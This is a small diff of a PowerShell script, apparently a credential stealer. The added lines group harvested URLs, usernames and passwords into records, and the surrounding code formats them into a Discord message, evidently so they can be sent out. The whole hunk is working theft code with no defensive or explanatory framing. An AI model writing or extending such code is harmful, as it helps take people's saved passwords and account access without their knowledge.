@@ -27,6 +27,14 @@ foreach ($field in $fields) {
     $extractedData += $matches
 }
 
+for ($i = 0; $i -lt $extractedData.Count; $i += 3) {
+    $groupedData += @{
+        URL = $extractedData[$i]
+        UserName = $extractedData[$i + 1]
+        Password = $extractedData[$i + 2]
+    }
+}
+
 foreach ($entry in $groupedData) {
     $discordMessage += "`nURL: $($entry.URL)`nUser Name: $($entry.UserName)`nPassword: $($entry.Password)`n"
 }
